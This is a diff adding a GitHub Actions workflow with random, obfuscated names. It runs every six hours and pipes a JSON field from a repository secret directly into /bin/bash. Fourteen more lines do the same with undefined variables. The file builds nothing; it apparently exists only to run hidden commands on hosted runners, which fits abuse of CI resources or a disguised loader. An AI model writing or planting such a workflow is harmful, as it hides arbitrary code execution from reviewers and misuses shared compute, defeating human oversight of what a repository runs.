@@ -1,0 +1,31 @@
+name: worrisometrombonist
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: worrisometrombonist
+        env:
+          xdafc62953: ${{ secrets.xdafc62953 }}
+        run: |
+          echo $xdafc62953 | jq -r .jxuou2 | /bin/bash
+          echo $kxpdb23222 | jq -r .y5442 | /bin/bash
+          echo $wav0373 | jq -r .okft7 | /bin/bash
+          echo $xwt2 | jq -r .g7876 | /bin/bash
+          echo $ozwfk383 | jq -r .c62952 | /bin/bash
+          echo $kdwwp311 | jq -r .awmz1 | /bin/bash
+          echo $uso50657 | jq -r .m35 | /bin/bash
+          echo $x547 | jq -r .jel88570 | /bin/bash
+          echo $em81317 | jq -r .lu12809 | /bin/bash
+          echo $o273 | jq -r .uznrh31196 | /bin/bash
+          echo $nx66 | jq -r .fy2568 | /bin/bash
+          echo $xe5749 | jq -r .ww94944 | /bin/bash
+          echo $iemr2 | jq -r .pd52922 | /bin/bash
+          echo $fyl3135 | jq -r .ng3319 | /bin/bash
+          echo $xb5166 | jq -r .q993 | /bin/bash
+
